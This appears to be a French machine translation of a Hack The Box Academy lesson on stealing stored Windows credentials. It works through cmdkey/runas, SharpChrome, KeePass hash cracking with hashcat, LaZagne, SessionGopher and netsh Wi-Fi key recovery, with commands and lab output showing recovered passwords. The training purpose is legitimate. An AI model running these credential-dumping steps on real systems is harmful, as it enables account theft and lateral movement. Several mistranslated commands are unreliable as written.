Autre vol d'informations d'identification
========================

* * * * *

Il existe de nombreuses autres techniques que nous pouvons utiliser pour potentiellement obtenir des informations d'identification sur un système Windows. Cette section ne couvrira pas tous les scénarios possibles, mais nous passerons en revue les scénarios les plus courants.

* * * * *

Cmdkey Identifiants enregistrés
------------------------

#### Liste des informations d'identification enregistrées

La commande [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) peut être utilisée pour créer, répertorier et supprimer des noms d'utilisateur et des mots de passe stockés. Les utilisateurs peuvent souhaiter stocker les informations d'identification d'un hôte spécifique ou l'utiliser pour stocker les informations d'identification des connexions aux services Terminal Server afin de se connecter à un hôte distant à l'aide de Remote Desktop sans avoir à saisir de mot de passe. Cela peut nous aider à passer latéralement à un autre système avec un utilisateur différent ou à élever les privilèges sur l'hôte actuel pour tirer parti des informations d'identification stockées pour un autre utilisateur.

Liste des informations d'identification enregistrées

```
C:\htb> cmdkey /list

     Cible : LegacyGeneric:target=TERMSRV/SQL01
     Genre : Générique
     Utilisateur : inlanefreight\bob

```

Lorsque nous tentons de RDP à l'hôte, les informations d'identification enregistrées seront utilisées.

![image](https://academy.hackthebox.com/storage/modules/67/cmdkey_rdp.png)

Nous pouvons également tenter de réutiliser les informations d'identification à l'aide de `runas` pour nous envoyer un reverse shell en tant qu'utilisateur, exécuter un binaire ou lancer une console PowerShell ou CMD avec une commande telle que :

#### Exécuter les commandes en tant qu'autre utilisateur

Exécuter des commandes en tant qu'autre utilisateur

```
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMANDE ICI"

```

* * * * *

Informations d'identification du navigateur
-------------------

#### Récupération des informations d'identification enregistrées à partir de Chrome

Les utilisateurs stockent souvent les informations d'identification dans leurs navigateurs pour les applications qu'ils visitent fréquemment. Nous pouvons utiliser un outil tel que [SharpChrome](https://github.com/GhostPack/SharpDPAPI) pour récupérer les cookies et les connexions enregistrées à partir de Google Chrome.

Récupération des informations d'identification enregistrées à partir de Chrome

```
PS C:\htb> .\SharpChrome.exe logins /unprotect

   __ _
  (_ |_ _. ._ ._ / |_ ._ _ ._ _ _
  __) | | (_| | |_) \_ | | | (_) | | | (/_
                 |
   v1.7.0

[*] Action : Triage des connexions enregistrées dans Chrome

[*] Triage des connexions Chrome pour l'utilisateur actuel

[*] Fichier de clé d'état AES : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] Clé d'état AES : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0

--- Identifiant Chrome (chemin : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/ 2021 17:16:52,13262735812597100,bob@inlanefreight.local,Bienvenue1

```

* * * * *

Gestionnaires de mots de passe
-----------------

De nombreuses entreprises fournissent des gestionnaires de mots de passe à leurs utilisateurs. Cela peut prendre la forme d'une application de bureau telle que `KeePass`, d'une solution basée sur le cloud telle que `1Password` ou d'un coffre-fort de mots de passe d'entreprise tel que `Thycotic` ou `CyberArk`. L'accès à un gestionnaire de mots de passe, en particulier celui utilisé par un membre du personnel informatique ou un service entier, peut conduire à un accès de niveau administrateur à des cibles de grande valeur telles que des périphériques réseau, des serveurs, des bases de données, etc. Nous pouvons avoir accès à un coffre-fort de mots de passe en réutilisant les mots de passe ou en devinant un mot de passe faible/commun. Certains gestionnaires de mots de passe tels que `KeePass` sont stockés localement sur l'hôte. Si nous trouvons un fichier `.kdbx` sur un serveur, un poste de travail ou un partage de fichiers, nous savons que nous avons affaire à une base de données `KeePass` qui est souvent protégée par un simple mot de passe principal. Si nous pouvons télécharger un fichier `.kdbx` sur notre hôte attaquant, nous pouvons utiliser un outil tel que [keepass2john](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17 633/keepass2john.py) pour extraire le hachage du mot de passe et exécutez-le via un outil de craquage de mot de passe tel que [Hashcat](https://github.com/hashcat) ou [John the Ripper](https://github.com/openwall/john).

#### Extraction du hachage KeePass

Tout d'abord, nous extrayons le hachage au format Hashcat à l'aide du script `keepass2john.py` .

Extraction du hachage KeePass

```
dsgsec@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx

ILFREIGHT_Help_Desk :$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c6302 * 63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154

```

#### Cracking Hash hors ligne

Nous pouvons ensuite transmettre le hachage à Hashcat, en spécifiant [hash mode](https://hashcat.net/wiki/doku.php?id=example_hashes) 13400 pour KeePass. En cas de succès, nous pouvons avoir accès à une multitude d'informations d'identification pouvant être utilisées pour accéder à d'autres applications/systèmes ou même à des périphériques réseau, des serveurs, des bases de données, etc., si nous pouvons accéder à une base de données de mots de passe utilisée par le personnel informatique.

Casser le hachagedoubler

```
dsgsec@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt

hashcat (v6.1.1) démarrage...

<SNIP>

Accès au cache du dictionnaire :
* Nom de fichier.. : /usr/share/wordlists/rockyou.txt
* Mots de passe. : 14344385
* Octets......: 139921507
* Espace clé.. : 14344385

$garderpass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465 cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1d ac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panthère1

Séance..........: hashcat
Statut........... : fissuré
Hash.Name........ : KeePass 1 (AES/Twofish) et KeePass 2 (AES)
Hash.Cible...... : $keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d...39c154
Heure.de.démarrage........: ven. 6 août 11:17:47 2021 (22 secs)
Heure.Estimée... : ven. 6 août 11:18:09 2021 (0 s)
Guess.Base....... : Fichier (/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Devine.Queue...... : 1/1 (100,00 %)
Vitesse.#1.........: 276 H/s (4.79ms) @ Accel:1024 Boucles:16 Thr:1 Vec:8
Récupéré........ : 1/1 (100,00 %) Résumés
Progression.........: 6144/14344385 (0.04%)
Rejeté......... : 0/6144 (0,00 %)
Point.de.restauration.... : 0/14344385 (0,00 %)
Restore.Sub.#1... : Sel : 0 Amplificateur : 0-1 Itération : 59984-60000
Candidats.#1....: 123456 -> iheartyou

Début : ven. 6 août 11:17:45 2021
Arrêté : ven. 6 août 11:18:11 2021

```

* * * * *

E-mail
-----

Si nous obtenons l'accès à un système joint à un domaine dans le contexte d'un utilisateur de domaine avec une boîte de réception Microsoft Exchange, nous pouvons tenter de rechercher dans l'e-mail de l'utilisateur des termes tels que "pass", "crédits", "informations d'identification", etc. en utilisant l'outil [MailSniper](https://github.com/dafthack/MailSniper).

* * * * *

Plus de plaisir avec les informations d'identification
-------------------------

Lorsque tout le reste échoue, nous pouvons exécuter l'outil [LaZagne](https://github.com/AlessandroZ/LaZagne) pour tenter de récupérer les informations d'identification à partir d'une grande variété de logiciels. Ces logiciels comprennent les navigateurs Web, les clients de chat, les bases de données, les e-mails, les vidages de mémoire, divers outils d'administration système et les mécanismes de stockage de mots de passe internes (par exemple, Autologon, Credman, DPAPI, secrets LSA, etc.). L'outil peut être utilisé pour exécuter tous les modules, des modules spécifiques (tels que des bases de données) ou contre un logiciel particulier (c'est-à-dire OpenVPN). La sortie peut être enregistrée dans un fichier texte standard ou au format JSON. Prenons-le pour un tour.

#### Affichage du menu d'aide de LaZagne

Nous pouvons afficher le menu d'aide avec l'indicateur `-h`.

Affichage du menu d'aide de LaZagne

```
PS C:\htb> .\lazagne.exe -h

utilisation : lazagne.exe [-h] [-version]
                    {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                    ...

|================================================ ===================|
| |
| Le Projet LaZagne |
| |
| ! BANG BANG ! |
| |
|================================================ ===================|

arguments positionnels :
   {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                         Choisissez une commande principale
     chats Exécuter le module de chats
     mails Exécuter le module mails
     tous Exécuter tous les modules
     git Lancer le module git
     svn Lancer le module svn
     Windows Exécuter le module Windows
     wifi Lancer le module wifi
     maven Exécuter le module maven
     sysadmin Lancer le module sysadmin
     navigateurs Exécuter le module des navigateurs
     jeux Exécuter le module de jeux
     multimédia Exécuter le module multimédia
     mémoire Exécuter le module de mémoire
     bases de données Exécuter le module de bases de données
     php Lancer le module php

arguments facultatifs :
   -h, --help affiche ce message d'aide et quitte
   -version laZagne version

```

#### Exécution de tous les modules LaZagne

Comme nous pouvons le constater, de nombreux modules s'offrent à nous. L'exécution de l'outil avec `all` recherchera les applications prises en charge et renverra toutes les informations d'identification en texte clair découvertes. Comme nous pouvons le voir dans l'exemple ci-dessous, de nombreuses applications ne stockent pas les informations d'identification de manière sécurisée (mieux vaut ne jamais stocker les informations d'identification, point final !). Ils peuvent facilement être récupérés et utilisés pour élever les privilèges localement, passer à un autre système ou accéder à des données sensibles.

Exécution de tous les modules LaZagne

```
PS C:\htb> .\lazagne.exe tout

|================================================ ===================|
| |
| Le Projet LaZagne |
| |
| ! BANG BANG !|
| |
|================================================ ===================|

########## Utilisateur : jordan ##########

------------------- Mots de passe Winscp -----------------

[+] Mot de passe trouvé !!!
URL : transfer.inlanefreight.local
Connexion : racine
Mot de passe : été 2020 !
Port : 22

------------------- Mots de passe Credman -----------------

[+] Mot de passe trouvé !!!
URL : dev01.dev.inlanefreight.local
Connexion : jordan_adm
Mot de passe: ! Q AZ z a q 1

[+] 2 mots de passe ont été trouvés.

Pour plus d'informations, relancez-le avec l'option -v

temps écoulé = 5,50499987602

```

* * * * *

Encore plus de plaisir avec les informations d'identification
------------------------------

Nous pouvons utiliser [SessionGopher](https://github.com/Arvanaghi/SessionGopher) pour extraire les identifiants PuTTY, WinSCP, FileZilla, SuperPuTTY et RDP enregistrés. L'outil est écrit en PowerShell et recherche et décrypte les informations de connexion enregistrées pour les outils d'accès à distance. Il peut être exécuté localement ou à distance. Il recherche dans la ruche `HKEY_USERS` tous les utilisateurs qui se sont connectés à un hôte joint à un domaine (ou autonome) et recherche et déchiffre toutes les informations de session enregistrées qu'il peut trouver. Il peut également être exécuté pour rechercher des lecteurs pour les fichiers de clé privée PuTTY (.ppk), Remote Desktop (.rdp) et RSA (.sdtid).

#### Exécution de SessionGopher en tant qu'utilisateur actuel

Nous avons besoin d'un accès administrateur local pour récupérer les informations de session stockées pour chaque utilisateur dans `HKEY_USERS`, mais cela vaut toujours la peine de s'exécuter en tant qu'utilisateur actuel pour voir si nous pouvons trouver des informations d'identification utiles.

Exécution de SessionGopher en tant qu'utilisateur actuel

```
PS C:\htb> Import-Module .\SessionGopher.ps1

PS C:\Tools> Invoke-SessionGopher-Target WINLPE-SRV01

           o_
          / ". SessionGopher
        ," _-"
      ," m m
   ..+ ) Brandon Arvanaghi
      `m..m Twitter: @arvanaghi | arvanaghi.com

[+] Creuser sur WINLPE-SRV01...
Sessions WinSCP

Source : WINLPE-SRV01\htb-student
Session : %20Paramètres par défaut
Nom d'hôte :
Nom d'utilisateur :
Mot de passe :

Sessions PuTTY

Source : WINLPE-SRV01\htb-student
Séance : nix03
Nom d'hôte : nix03.inlanefreight.local

Séances SuperPuTTY

Source : WINLPE-SRV01\htb-student
ID de session : NIX03
Nom de session : NIX03
Hébergeur : nix03.inlanefreight.local
Nom d'utilisateur : srvadmin
ExtraArgs :
Port : 22
Session Putty : Paramètres par défaut

```

* * * * *

Mots de passe Wi-Fi
--------------

#### Affichage des réseaux sans fil enregistrés

Si nous obtenons un accès administrateur local au poste de travail d'un utilisateur avec une carte sans fil, nous pouvons répertorier tous les réseaux sans fil auxquels il s'est récemment connecté.

Affichage des réseaux sans fil enregistrés

```
C:\htb> netsh wlan afficher le profil

Profils sur l'interface Wi-Fi :

Profils de stratégie de groupe (lecture seule)
---------------------------------
     <Aucun>

Des profils d'utilisateurs
--------------
     Profil d'utilisateur : Smith Cabin
     Tous les profils d'utilisateur : iPhone de Bob
     Tous les profils utilisateur : EE_Guest
     Tous les profils utilisateur : EE_Guest 2.4
     Profil de tous les utilisateurs : ilfreight_corp

```

#### Récupération des mots de passe sans fil enregistrés

En fonction de la configuration du réseau, nous pouvons récupérer la clé pré-partagée (` Contenu de la clé` ci-dessous) et éventuellement accéder au réseau cible. Bien que rare, nous pouvons rencontrer cela lors d'un engagement et utiliser cet accès pour accéder à un réseau sans fil séparé et accéder à des ressources supplémentaires.

Récupération des mots de passe sans fil enregistrés

```
C:\htb> netsh wlan afficher le profil ilfreight_corp key=clear

Profil ilfreight_corp sur l'interface Wi-Fi :
================================================= =====================

Appliqué : Tous les profils utilisateur

Informations sur le profil
-------------------
     Version 1
     Type : LAN sans fil
     Nom : ilfreight_corp
     Options de contrôle :
         Mode de connexion : Se connecter automatiquement
         Diffusion réseau : Connectez-vous uniquement si ce réseau diffuse
         AutoSwitch : ne pas basculer vers d'autres réseaux
         Randomisation MAC : Désactivé

Paramètres de connectivité
---------------------
     Nombre de SSID : 1
     Nom SSID : "ilfreight_corp"
     Type de réseau : Infrastructure
     Type de radio : [ Tout type de radio ]
     Extension de fournisseur : non présente

Les paramètres de sécurité
-----------------
     Authentification : WPA2-Personnel
     Chiffre : CCMP
     Authentification : WPA2-Personnel
     Chiffre : GCMP
     Clé de sécurité : Présent
     Contenu clé : ILFREIGHTWIFI-CORP123908 !

Paramètres de coût
--------------
     Coût : Illimité
     Encombré : Non
     Approche de la limite de données : Non
     Au-dessus de la limite de données : Non
     Itinérance : Non
     Source de coût : par défaut

```